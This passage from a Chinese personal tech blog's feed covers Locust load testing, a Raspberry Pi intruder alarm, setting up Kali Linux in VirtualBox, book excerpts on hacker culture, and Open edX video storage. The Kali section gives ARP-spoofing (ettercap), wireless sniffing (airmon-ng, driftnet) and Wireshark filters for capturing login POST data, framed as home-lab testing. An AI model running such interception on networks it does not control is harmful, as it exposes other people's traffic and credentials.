&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;locust&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Locust&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;TaskSet&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;task&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;MyTaskSet&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;TaskSet&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;min_wait&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;5000&lt;/span&gt;
    &lt;span class="n"&gt;max_wait&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;15000&lt;/span&gt;

    &lt;span class="nd"&gt;@task&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;task1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/index&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class="sd"&gt;    @task&lt;/span&gt;
&lt;span class="sd"&gt;    def task2(self):&lt;/span&gt;
&lt;span class="sd"&gt;        self.client.get(&amp;quot;/page2&amp;quot;)&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;MyLocust&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Locust&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;task_set&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MyTaskSet&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;locust  -f locustfile.py --host=http://www.example.com&lt;/p&gt;
&lt;p&gt;之后打开：127.0.0.1:8089,即可开始测试&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/stress-testinge8fe2273.png" /&gt;&lt;/p&gt;
&lt;p&gt;模拟登录的测试，下回有空再做.在locust中处理session很容易:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The HttpSession instance will preserve cookies between requests so that it can be used to log in to websites and keep a session between requests.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.ha97.com/4617.html"&gt;Web性能压力测试工具之ApacheBench（ab）详解&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://weibo.com/ttarticle/p/show?id=230940395887204907232"&gt;基于Locust、Tsung的百万并发秒杀压测案例&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.xuh.me/post/testing/locust-intro"&gt;Locust负载测试框架初探&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://zhuhangyu.github.io/python/locust-for-login/"&gt;用locust+selenium压力测试登录后的页面&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 08 Oct 2016 00:00:00 +0000</pubDate><guid>tag:,2016-10-08:stress-testing.html</guid><category>tools</category></item><item><title>树莓派守护者!</title><link>/pi-guardian.html</link><description>&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/pi_swzbe54be0b.png" /&gt;&lt;/p&gt;
&lt;h1&gt;老虎机与行窃少年&lt;/h1&gt;
&lt;p&gt;那年我大概十岁。&lt;/p&gt;
&lt;p&gt;家门口小店入驻了一台老虎机,每天放学回家路过小店，机器周围，围观者众。&lt;/p&gt;
&lt;p&gt;晚饭后喜欢跑到小店，看人们下注、击键、大笑、咒骂、跺脚，我喜欢老虎机侧边的位置，从这里透过机器的缝隙，看得到里边的电路板，上边数字闪烁，毫无规律&lt;/p&gt;
&lt;p&gt;此后许久，我对老虎机的兴趣一直很浓厚，多年之后，在大学图书馆的一角，饶有兴致地读到老虎机算法作者的书籍，他谈到你不可能赢过机器，唯一的获胜机会就是赢取你的同伴：你将机器视为中介，根据前边参与者的胜负，决定你的策略，这是你唯一获胜的可能&lt;/p&gt;
&lt;p&gt;某天一早，小店门口停着警车，热闹非凡，凑热闹这种事十岁小孩再感兴趣不过了。挤入小店，看到4个少年垂首丧气，双手被扣,十五六岁年纪. 是店里老虎机坐上常客。&lt;/p&gt;
&lt;p&gt;好事者纷纷问缘由，老板春风满面, 说起这群少年，如何三番五次，入室盗窃，手法精巧，行事谨慎. &lt;/p&gt;
&lt;p&gt;人们又问，你既说他们机智，你又如何逮到他们。&lt;/p&gt;
&lt;p&gt;老板等的便是这句，登时状如登上领奖台做获奖感言. 老板说自己早便发现他们入室盗窃，为了证据确凿，设计了一套精巧的陷阱：在柜台入口，近地面处系一根绳子，绳子一直连到老板睡觉的卧室，在卧室里系上易拉罐。少年们再次登门，触发开关，弄倒老板卧室的易拉罐，老板醒后，有备而来，少年们毫无知觉，来个瓮中捉鳖&lt;/p&gt;
&lt;p&gt;末了老板感叹一句这等聪明，用到学习上得多出色&lt;/p&gt;
&lt;p&gt;人们纷纷赞叹&lt;/p&gt;
&lt;h1&gt;基于树莓派的报警器&lt;/h1&gt;
&lt;p&gt;故事里，有一处不够优美:报警器竟是绳子做的！如果少年们更警觉些，看到绳子，或是踩到之后便逃离，老板恐怕要竹篮打水一场空。&lt;/p&gt;
&lt;p&gt;我们可以基于树莓派来重构报警器&lt;/p&gt;
&lt;h3&gt;思路&lt;/h3&gt;
&lt;p&gt;将超声波传感器（或者红外线）放在柜台下边，当有人路过时，树莓派给老板手机发送一条短信（或邮件），这个隐形的卫士几乎没有破绽&lt;/p&gt;
&lt;h3&gt;实现（硬件）&lt;/h3&gt;
&lt;p&gt;硬件部分，我们使用移动电源为树莓派供电，便于藏匿（移动电源可用大约一周）&lt;/p&gt;
&lt;p&gt;接线图如下(只需要关注超声波传感器)：&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="https://raw.githubusercontent.com/wwj718/gif_bed/master/pi_fritzing.png" /&gt;&lt;/p&gt;
&lt;h3&gt;实现（软件）&lt;/h3&gt;
&lt;p&gt;软件部分，我已经把源码放到这里了：&lt;a href="https://github.com/wwj718/raspberrypi_lab"&gt;raspberrypi_lab&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这个项目的核心是，利用超声波传感器测距，当传感器前边有物体时，距离将发生变化，于是触发其他函数（发邮件）即可,核心源码为:&lt;a href="https://github.com/wwj718/raspberrypi_lab/blob/master/echo_main.py"&gt;echo_main&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如果你想发送邮件，使用python的smtp库即可，如果你想发送短信，可以使用Twilio的api:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;twilio.rest&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;TwilioRestClient&lt;/span&gt;
&lt;span class="n"&gt;account&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;xxx&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;xxx&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;client&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;TwilioRestClient&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;account&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;message&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;messages&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;+86137xxx&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;from_&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;+166xxx&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Wake up!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;代码跑起来后，把它放柜台下，有人路过时，即可悄无声息地发送短信报警!&lt;/p&gt;
&lt;h1&gt;守护你的私密空间&lt;/h1&gt;
&lt;p&gt;我们来继续发挥&lt;code&gt;守护者&lt;/code&gt;这个概念，这次的目的是为了保护在房间里不好好学习，爱瞎折腾的你&lt;/p&gt;
&lt;p&gt;想想你在自己房间里看哆啦A梦(当然你也可以看些别的(羞射脸))&lt;/p&gt;
&lt;p&gt;班主任正在你家客厅家访。搞得你看动画片都不踏实,深怕有人破门而入&lt;/p&gt;
&lt;p&gt;让我们发挥geek精神，把树莓派打造为私密空间守护者。这个守护者的职责是：当有人进入房间时，在led矩阵上亮起笑脸以示欢迎，同时用蜂鸣器演奏一首歌吸引注意(我用了葫芦娃，你可以用老师窗前之类的 ^_^)&lt;/p&gt;
&lt;p&gt;led矩阵的源码如下：&lt;a href="https://github.com/wwj718/raspberrypi_lab/blob/master/smile.py"&gt;smile.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;蜂鸣器部分的源码为:&lt;a href="https://github.com/wwj718/raspberrypi_lab/blob/master/beep.py"&gt;beep.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;当门被打开时，超声波传感器将感觉到障碍物的出现，这是触发笑脸和音乐，最有意思的是下一步&lt;/p&gt;
&lt;h3&gt;切换电脑屏幕&lt;/h3&gt;
&lt;p&gt;你要知道你这个时候正看哆啦A梦看得兴起,你可能沉迷其中，听到音乐也来不及切换电脑屏幕，上班这段动作是典型的&lt;code&gt;触发&lt;/code&gt;模式，适合让机器来做，把它自动化！&lt;/p&gt;
&lt;p&gt;我们在电脑上跑起来一个进程，这个进程是个web服务，可以被调用，当被调用时（来自树莓派的http请求），我们的电脑屏幕将自动切换到iBook阅读界面，切换速度在毫秒级别，老师/家长一进门，便看到你在津津有味地看书，因为你还没从动画片里缓过神，肯定盯住屏幕的书。老师欣然离去&lt;/p&gt;
&lt;p&gt;这是打开之前你的屏幕：
&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/pi_guardian083cd92b.png" /&gt;&lt;/p&gt;
&lt;p&gt;哦不对，拿错图片了：
&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/pi_guardiancea87d3d.png" /&gt;&lt;/p&gt;
&lt;p&gt;这是房门打开之后你的屏幕：
&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/pi_guardian3aae2aad.png" /&gt;&lt;/p&gt;
&lt;p&gt;这个web服务的源码在这里：&lt;a href="https://github.com/wwj718/raspberrypi_lab/blob/master/pc_server.py"&gt;pc_server&lt;/a&gt;, 这个功能涉及代码很短，只有几行：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nd"&gt;@app.route&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/study&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;study&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;to study&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;open&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/Applications/iBooks.app&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; 
    &lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;command&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;study&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;有了树莓派守护者，你就可以不必反锁房门，在你的电脑上做任何事儿, 不用担心被察觉啦&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 07 Oct 2016 00:00:00 +0000</pubDate><guid>tag:,2016-10-07:pi-guardian.html</guid><category>技术</category></item><item><title>在mac虚拟机中安装Kali Linux</title><link>/safe.html</link><description>&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/kali54f8fd85.png" /&gt;&lt;/p&gt;
&lt;p&gt;一直对信息安全感兴趣，奈何兴趣庞杂，静不下心在一个领域，安全方面折腾得不多，近期折腾了一段时间硬件，对无线安全和通信过程的兴趣又被吊起，准备重新搭建一下渗透测试环境&lt;/p&gt;
&lt;p&gt;前几天在看《黑客军团》，看完更是觉得安全是个有趣的话题&lt;/p&gt;
&lt;p&gt;此前的环境搭建在U盘里，在mac下使用并不方便，一方面是kali中，触摸板用得很累，另一方面，无线网的配置也很烦。索性决定把Kali安装到虚拟机里，如此一来，我在mac下ssh进去即可。同时环境在虚拟机中，也更安全&lt;/p&gt;
&lt;h1&gt;Kali Linux&lt;/h1&gt;
&lt;p&gt;Kali Linux是基于Debian的Linux发行版，设计用于数字鉴识和渗透测试。Kali Linux的前身是BackTrack Linux。&lt;/p&gt;
&lt;p&gt;Kali Linux预装了许多渗透测试软件，包括nmap（端口扫描工具）、Wireshark（数据包分析器）、John the Ripper（密码破解器）以及Aircrack-NG（一套用于对无线局域网进行渗透测试的软件）。用户可通过硬盘、live CD或live USB运行Kali Linux  &lt;/p&gt;
&lt;p&gt;它还有基于ARM架构的镜像，可用于树莓派&lt;/p&gt;
&lt;h1&gt;此前经验&lt;/h1&gt;
&lt;p&gt;此前零零散散读过密码学，主流的安全/渗透工具大多做过基本了解，不过仅限于书本知识，对原理了解一下，没啥实际使用经验。&lt;/p&gt;
&lt;p&gt;就实战经验来说，可能对aircrack-ng/nmap/netcat 相对熟悉。有实际使用经验&lt;/p&gt;
&lt;p&gt;此外，熟悉Python/linux/http。日常重度依赖于这些工具/协议，这块的知识算得扎实&lt;/p&gt;
&lt;p&gt;对于编程相关的工作，我一直喜欢《黑客》一书中提倡的：&lt;code&gt;在使用中学习&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;安装&lt;/h1&gt;
&lt;h3&gt;环境准备&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Virtualbox。我的虚拟机为Virtualbox 5.0.26。版本建议选择5.0.26或5.1.16。以便安装&lt;a href="https://www.virtualbox.org/wiki/Downloads"&gt;Oracle VM VirtualBox Extension Pack  usb2.0&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;直接下载安装好的虚拟机镜像（ova），导入即用。&lt;a href="https://www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/"&gt;虚拟机镜像下载地址&lt;/a&gt;。我同时下了完整版和精简版：&lt;a href="https://images.offensive-security.com/virtual-images/Kali-Linux-Light-2016.2-vbox-amd64.ova"&gt;Kali Linux Light 64 bit VBox&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ps：建议镜像都从官方网站下载，之后比对下md5. 如果你的目的是渗透测试，一开始使用的镜像就是被动过手脚的，就太讽刺了。kali的镜像下载有点慢，我是在国外服务器上下好再拉回本地：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# 在国外服务器下载&lt;/span&gt;
wget https://images.offensive-security.com/virtual-images/Kali-Linux-2016.2-vbox-amd64.torrent &lt;span class="c1"&gt;#完整版，3.6G不到6分钟下完,速度接近10+M/s&lt;/span&gt;
aria2c    Kali-Linux-2016.2-vbox-amd64.torrent
&lt;span class="c1"&gt;#scp 拉回本地&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;导入虚拟机&lt;/h3&gt;
&lt;p&gt;ps：我的mac固态硬盘空间比较小，我把虚拟机镜像和&lt;code&gt;默认虚拟机电脑位置&lt;/code&gt;都放到移动硬盘里。如果你也想这样，可以通过Virtualbox的偏好设置来做&lt;/p&gt;
&lt;p&gt;在Virtualbox中,选择&lt;code&gt;管理-&amp;gt;导入虚拟电脑&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;配置usb无线网卡&lt;/h3&gt;
&lt;p&gt;如果我们想做无线测试，就需要给kali配置无线网卡。虚拟机里的kali无法使用宿主机（mac）的无线网卡，我们需要连接usb无线网卡。&lt;/p&gt;
&lt;p&gt;我的usb无线网卡是Realtek，随树莓派一起买的。把usb无线网卡连上电脑后，在Virtualbox做如下配置即可：&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/usb_kalic9f80e58.png" /&gt;&lt;/p&gt;
&lt;p&gt;启动kali后，输入ifconfig（iwconfig），就能看到wlan0了&lt;/p&gt;
&lt;h3&gt;启动&lt;/h3&gt;
&lt;p&gt;双击启动即可，默认用户名密码为：&lt;code&gt;root:toor&lt;/code&gt;, 登录后，我们即可看到本文开始的截图&lt;/p&gt;
&lt;h1&gt;配置&lt;/h1&gt;
&lt;h3&gt;ssh&lt;/h3&gt;
&lt;p&gt;我喜欢iterm2，想在mac下写代码，所以需要让kali支持外部ssh登录&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# 添加sudo用户，默认是root用户，无法从ssh登陆&lt;/span&gt;
adduser kalitest
gpasswd -a kalitest sudo
vim /etc/ssh/sshd_config &lt;span class="c1"&gt;# 使用 PasswordAuthentication yes&lt;/span&gt;
/etc/init.d/ssh restart &lt;span class="c1"&gt;# 重启ssh&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;测试&lt;/h1&gt;
&lt;h3&gt;ettercap&lt;/h3&gt;
&lt;p&gt;先用fing看下设备,我的手机设备，ip为&lt;code&gt;192.168.1.101&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ettercap -i eth0 -Tq -M arp:remote /192.168.0.101/ /192.168.0.1/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在mac下&lt;code&gt;brew install ettercap&lt;/code&gt;即可.&lt;/p&gt;
&lt;p&gt;之后可以进行抓包&lt;/p&gt;
&lt;h3&gt;抓包&lt;/h3&gt;
&lt;p&gt;kali自带driftnet，在mac下需要使用port安装&lt;/p&gt;
&lt;p&gt;我们来测试下抓包，设置网卡为监控模式：&lt;code&gt;airmon-ng start wlan0&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后使用Wireshark抓包，或者使用driftnet来查看图像数据：&lt;code&gt;driftnet -i wlan0&lt;/code&gt;&lt;/p&gt;
&lt;h4&gt;Wireshark&lt;/h4&gt;
&lt;p&gt;Wireshark是个大话题，有空单独写篇文章，我们在此只抓取192.168.0.101发出的htttp数据包: &lt;code&gt;http and ip.src == 192.168.0.101&lt;/code&gt; （监控进出的为ip.addr）&lt;/p&gt;
&lt;p&gt;在本机(192.168.0.104)测试抓取自己的网站的用户信息：&lt;code&gt;ip.src == 192.168.0.104 and http.request.method == "POST"&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;对于https网站，可以参考:&lt;a href="https://certsimple.com/blog/ssl-wireshark-mac-osx"&gt;Wireshark 2 is the simplest way to inspect HTTPS on your Mac&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/Kali_Linux"&gt;wikipedia Kali Linux&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/"&gt;大学霸 Kali Linux 安全渗透教程&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 07 Oct 2016 00:00:00 +0000</pubDate><guid>tag:,2016-10-07:safe.html</guid><category>技术</category></item><item><title>黑客: 计算机革命的英雄</title><link>/Hackers-Heroes-of-the-Computer-Revolution.html</link><description>&lt;p&gt;&lt;strong&gt;&lt;em&gt;***摘自《黑客: 计算机革命的英雄》&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;*&lt;/strong&gt;*&lt;/p&gt;
&lt;p&gt;ps：我的kindle上的多看系统出了问题，导出摘记时，时间紊乱,所以先后顺序不一&lt;/p&gt;
&lt;p&gt;todo:写个程序把导出的摘记按时间排序&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他总是设想科幻小说中的场景——假如未来的某一天，工业基础设施会突然之间灰飞烟灭，那么人们应该能够从旧世界的破砖烂瓦中捡拾出一些零件，让计算机继续运转下去；因此，在理想状况下，计算机的设计要尽量让用户一目了然，能准确地把零件安装到合适的位置&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;它给黑客的行动开了绿灯，只要是为了工作，他们可以到任何地方，取用任何东西帮助他们在电子世界遨游、在计算机科学领域奏出华美的乐章……但条件是不能到处宣扬“官僚的皇帝其实什么也没有穿&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;假如我发现某种计算机产生了极其愚蠢的错误，或设计上有毛病或者其他什么问题，那我绝对从心底瞧不上它，”高斯珀后来解释说。“可是PDP-6的表现好像总是那么完美。如果发现了错误，我也愿意修改。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这些年轻人以一种难以言表的友好眼光来看待他的同学：或许他们可以相互帮助，共同探索事物的本质，进而掌握它们。已经有很多难题等着他们去解决，为什么还要在乎那些愚蠢的、喜欢阿谀奉承的老师呢？为什么还要为分数担心呢？对彼得·萨姆森这样的学生来说，探求问题比学位重要得多&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对计算机的访问（以及任何可能帮助你认识我们这个世界的事物）应该是不受限制的、完全的。任何人都有动手尝试的权利！ 黑客们相信，通过将东西拆开，了解它们的工作原理，并根据这种理解创造新奇的甚至更有趣的东西，可以学习到关于系统（关于世界）的重要知识。他们痛恨一切试图阻止他们这么做的人、物理障碍或者法律。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;虽然弗雷德金对这些黑客赞赏有加，但他骨子里还是认为他自己才是最好的程序员。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他们眼中都有一小团激扬的火焰。她以前常说，有的人有种内在的品质，虽然他们看上去好像邋遢的盲流，但假如你看他们的脸，看他们的双眼，你就知道他们是什么样的人了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;由于速度太慢，黑客们得出结论，认为该系统的大脑一定受到了损伤——脑残。这一经常被用来形容Multics的词现在已经变成黑客们标准的轻蔑语&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这个小组的第一次努力是试图找到《LIFE》世界中的结构，这在理论上是可能的，但是一直没有人发现。通常来说，无论开始的图案是怎样的，在几代之后，这个图案都会逐渐消失直至没有细胞存在或者转换为大量标准图案之一，这些标准图案都是以细胞集合形成的形状命名的，包括蜂巢、蜂场（四个蜂巢）、太空飞船、火药桶、灯塔、拉丁十字架、蟾蜍和风车等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;它的演奏纯粹、青涩，就好像是一年级小学生的处女秀。当最后一个音符演奏完毕时，所有的与会者都已经完全惊呆了，谁也说不出一句话。他们刚刚亲耳听到他们所追求的黑客之梦已变成了现实。而这一梦想在几周前看起来还是那么的模糊和遥不可及。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;李·费尔森斯坦将这些人称为“一群逃犯，至少暂时是计算机行业的逃犯，或不受老板器重的人。我们这些人凑到一起做些无关痛痒的事情，因为这都是行业巨头们根本不屑一顾的事。但我们心里清楚，我们应该抓住机会做些自己认为该做的事情&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 28 Sep 2016 00:00:00 +0000</pubDate><guid>tag:,2016-09-28:Hackers-Heroes-of-the-Computer-Revolution.html</guid><category>book</category></item><item><title>为Open edX集成七牛云存储</title><link>/open-edx-qiniu.html</link><description>&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/qiniuf2e44878.png" /&gt;&lt;/p&gt;
&lt;h1&gt;Open edX与视频流&lt;/h1&gt;
&lt;p&gt;在Open edX的众多组件和服务中，并不包含视频流服务。不可否认的是，在线教育中，视频是要素之一，也许是最重要的要素之一，对一些人而言，甚至没有之一。&lt;/p&gt;
&lt;p&gt;视频流一般被视为一个common server，市面上有数不清的商业或是开源解决方案，Open edX没有去重造车轮，而是和youtube做了很多整合。我们与youtube无缘。当然作为通用的组件，Open edX中的视频模块支持一般的视频资源（url），无论是云存储还是自建服务&lt;/p&gt;
&lt;h3&gt;自建视频流&lt;/h3&gt;
&lt;p&gt;如果准备自建视频流服务，可以参考@MT的&lt;a href="http://edustack.org/2015/10/17/%E5%9C%A8%E5%86%85%E9%83%A8%E7%BD%91%E7%BB%9C%E4%B8%BAedx%E9%85%8D%E7%BD%AE%E8%A7%86%E9%A2%91%E6%9C%8D%E5%8A%A1/"&gt;在内部网络为edX配置视频服务&lt;/a&gt;。对于局域网内的用户（学校/企业），自建服务是个有诱惑力的方案。&lt;/p&gt;
&lt;p&gt;不过这里边存在的坑是，视频流服务搭建不难，搭建一个友好的客户端，上传管理视频却颇为不易。在此推荐使用&lt;a href="https://github.com/minio/minio"&gt;minio&lt;/a&gt;作为管理视频资源的工具，细节可以参考我的这篇文章:&lt;a href="http://blog.just4fun.site/install-Minio-Cloud-Storage.html"&gt;构建类s3存储系统（Minio）&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;使用云存储&lt;/h3&gt;
&lt;p&gt;视频解决方案有很多，大家可以自行google，看大家的对比评测，再结合自己的需求选型，在此就不多推荐了&lt;/p&gt;
&lt;p&gt;我比较偏好&lt;a href="http://www.qiniu.com/"&gt;七牛云&lt;/a&gt;。对开发者友好，api写得很漂亮&lt;/p&gt;
&lt;p&gt;在此演示如何使用七牛云为open edX提供视频服务，并将客户端（js）集成其中&lt;/p&gt;
&lt;h1&gt;成果展示&lt;/h1&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/qiniuf2e44878.png" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/qiniu_upload2f7fea6e.png" /&gt;&lt;/p&gt;
&lt;h1&gt;思路与设计&lt;/h1&gt;
&lt;h3&gt;如何集成&lt;/h3&gt;
